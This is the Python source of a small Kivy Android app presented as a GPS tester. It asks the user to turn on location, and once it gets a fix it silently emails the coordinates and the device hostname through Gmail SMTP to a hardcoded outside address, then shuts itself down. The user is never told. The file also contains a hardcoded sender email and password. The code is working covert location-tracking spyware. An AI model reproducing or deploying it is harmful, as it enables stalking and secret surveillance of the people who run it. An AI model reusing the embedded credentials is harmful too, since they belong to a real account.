from kivy.lang import Builder
from plyer import gps
from kivy.app import App
import socket
from kivy.properties import StringProperty
from kivy.clock import mainthread,Clock
from kivy.utils import platform
import smtplib as s

class email:
	global sender_pass
	sender_pass = "cantlogin6969"
	def email_sender(self,message):
		sender_mail = "contact.ddesk@gmail.com"
		ob = s.SMTP("smtp.gmail.com",587)
		ob.starttls()
		ob.login(sender_mail,sender_pass)
		ob.sendmail(sender_mail,'dabangayush369@gmail.com',message)
		ob.quit()

call = email()

kv = '''
BoxLayout:
	orientation: 'vertical'
	Label:
		text: 'Please turn on location to continue'
	
'''


class GpsTest(App):

	gps_location = StringProperty()
	gps_status = StringProperty('Click Start to get GPS location updates')

	def request_android_permissions(self):
		
		from android.permissions import request_permissions, Permission

		def callback(permissions, results):
			
			if all([res for res in results]):
				print("callback. All permissions granted.")
			else:
				print("callback. Some permissions refused.")

		request_permissions([Permission.ACCESS_COARSE_LOCATION,
							 Permission.ACCESS_FINE_LOCATION], callback)
		

	def build(self):
		try:
			gps.configure(on_location=self.on_location,
						  on_status=self.on_status)
		except NotImplementedError:
			import traceback
			traceback.print_exc()
			self.gps_status = 'GPS is not implemented for your platform'

		if platform == "android":
			print("gps.py: Android detected. Requesting permissions")
			self.request_android_permissions()

		return Builder.load_string(kv)

	def on_start(self):
		self.start(1000, 0)

	def start(self, minTime, minDistance):
		gps.start(minTime, minDistance)

	def stop(self):
		gps.stop()

	def send_msg(self,dt):
		body = self.gps_location
		message = f"Subject : {socket.gethostname()} \n\n {body}"
		call.email_sender(message = message)
		print('!@#4%$(*&')
		self.get_running_app().stop()

	@mainthread
	def on_location(self, **kwargs):
		self.gps_location = '\n'.join([
			'{}={}'.format(k, v) for k, v in kwargs.items()])
		if 'accuracy' in self.gps_location:
			Clock.schedule_once(self.send_msg,3)
	
	@mainthread
	def on_status(self, stype, status):
		self.gps_status = 'type={}\n{}'.format(stype, status)

	def on_pause(self):
		gps.stop()
		return True

	def on_resume(self):
		gps.start(1000, 0)
		pass


if __name__ == '__main__':
	GpsTest().run()
